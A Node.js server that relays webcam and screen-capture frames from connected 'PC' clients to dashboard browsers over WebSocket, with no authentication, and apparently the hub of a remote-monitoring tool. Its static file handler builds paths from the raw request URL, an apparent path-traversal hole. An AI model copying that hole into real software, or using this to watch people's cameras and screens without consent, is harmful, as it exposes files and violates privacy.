const http = require('http');
const fs   = require('fs');
const path = require('path');
const { WebSocketServer } = require('ws');

// ─── CONFIG ──────────────────────────────────────────────────────────────────
const PORT = process.env.PORT || 8080;
// ─────────────────────────────────────────────────────────────────────────────

const httpServer = http.createServer((req, res) => {
    let filePath = path.join(__dirname, 'public',
        req.url === '/' ? 'index.html' : req.url);
    fs.readFile(filePath, (err, data) => {
        if (err) { res.writeHead(404); res.end('Not found'); return; }
        const mime = { '.html': 'text/html', '.js': 'application/javascript',
                       '.css': 'text/css' }[path.extname(filePath)] || 'application/octet-stream';
        res.writeHead(200, { 'Content-Type': mime });
        res.end(data);
    });
});

const wss = new WebSocketServer({ server: httpServer });

// pcId -> { hasCamera, lastSeen }
const pcs = new Map();
const dashboards = new Set();

wss.on('connection', (ws, req) => {
    const url = new URL(req.url, `http://localhost:${PORT}`);

    // Dashboard browser client
    if (url.searchParams.get('role') === 'dashboard') {
        dashboards.add(ws);
        // Send current PC list on connect
        ws.send(JSON.stringify({ type: 'pc_list', pcs: [...pcs.entries()].map(([id, v]) => ({ id, ...v })) }));
        ws.on('close', () => dashboards.delete(ws));
        return;
    }

    // PC client
    let pcId = null;

    ws.on('message', (data) => {
        try {
            const msg = JSON.parse(data);

            if (msg.type === 'hello') {
                pcId = msg.id;
                pcs.set(pcId, { hasCamera: msg.hasCamera, hasScreen: msg.hasScreen || false, lastSeen: Date.now() });
                broadcast(dashboards, { type: 'pc_connected', id: pcId, hasCamera: msg.hasCamera, hasScreen: msg.hasScreen || false });
                console.log(`[+] PC connected: ${pcId} | camera: ${msg.hasCamera} | screen: ${msg.hasScreen}`);
            }

            if (msg.type === 'frame' && msg.id) {
                pcs.set(msg.id, { ...pcs.get(msg.id), lastSeen: Date.now() });
                broadcast(dashboards, { type: 'frame', id: msg.id, frame: msg.frame });
            }

            if (msg.type === 'screen_frame' && msg.id) {
                pcs.set(msg.id, { ...pcs.get(msg.id), lastSeen: Date.now() });
                broadcast(dashboards, { type: 'screen_frame', id: msg.id, frame: msg.frame });
            }

        } catch (e) {
            console.error('[!] Bad message:', e.message);
        }
    });

    ws.on('close', () => {
        if (pcId) {
            pcs.delete(pcId);
            broadcast(dashboards, { type: 'pc_disconnected', id: pcId });
            console.log(`[-] PC disconnected: ${pcId}`);
        }
    });
});

function broadcast(clients, obj) {
    const msg = JSON.stringify(obj);
    for (const c of clients) if (c.readyState === 1) c.send(msg);
}

httpServer.listen(PORT, () => console.log(`[*] Server on port ${PORT}`));
